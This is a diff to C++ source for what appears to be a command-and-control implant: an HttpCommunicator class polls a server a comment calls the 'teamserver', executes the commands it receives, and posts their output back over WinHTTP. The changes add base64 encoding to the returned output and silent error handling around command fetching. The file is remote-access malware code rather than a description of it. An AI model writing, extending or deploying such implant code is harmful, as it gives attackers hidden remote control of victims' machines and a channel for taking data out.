@@ -2,6 +2,7 @@
 #include "dependencies.h"
 #include <iostream>
 #include "core.h"
+#include "base64.h"
 
 
 HttpCommunicator* HttpCommunicator::communicator = NULL;
@@ -132,11 +133,17 @@ void HttpCommunicator::get_commands() {
 		}
 		buf.insert(buf.end(), std::begin(temp), std::end(temp));
 	} while (bytesRead > 0);
-
-	std::string resultStr(buf.begin(), buf.end());
-	std::vector<std::string> resultDeserialized = dependencies::deserialize_array(resultStr);
-	this->commandsToExecute.insert(this->commandsToExecute.end(), resultDeserialized.begin(), resultDeserialized.end());
-	this->execute_commands();
+	try {
+		std::string resultStr(buf.begin(), buf.end());
+		if (true) {
+			std::vector<std::string> resultDeserialized = dependencies::deserialize_array(resultStr);
+			this->commandsToExecute.insert(this->commandsToExecute.end(), resultDeserialized.begin(), resultDeserialized.end());
+			this->execute_commands();
+		}
+	}
+	catch (int err) {
+		// Doesn't matter - it cannot find the teamserver
+	}
 }
 
 void HttpCommunicator::send_output(std::string msg) {
@@ -189,10 +196,17 @@ void HttpCommunicator::send_output(std::string msg) {
 		NULL, // NULL - foloseste HTTP/1.1
 		WINHTTP_NO_REFERER, // nu va folosi referer
 		WINHTTP_DEFAULT_ACCEPT_TYPES,
-		WINHTTP_FLAG_REFRESH
+		0
 	);
 
-	LPSTR postBody = const_cast<char*>(msg.c_str());
+	std::vector<BYTE> postBodyBytes(msg.begin(), msg.end());
+	postBodyBytes.push_back('\0');
+	BYTE* toEncodeBytes = &postBodyBytes[0];
+	int bytesSize = postBodyBytes.size();
+	std::string base64EncMsg = base64::encode(toEncodeBytes, bytesSize);
+
+	//base64EncMsg = "log=test";
+	LPSTR postBody = const_cast<char*>(base64EncMsg.c_str());
 
 	bool retry = false;
 	DWORD result;
@@ -203,7 +217,7 @@ void HttpCommunicator::send_output(std::string msg) {
 
 		if (!WinHttpSendRequest(
 			hReq,
-			L"text/plain",
+			L"content-type:text/plain",
 			-1,
 			postBody,
 			strlen(postBody),
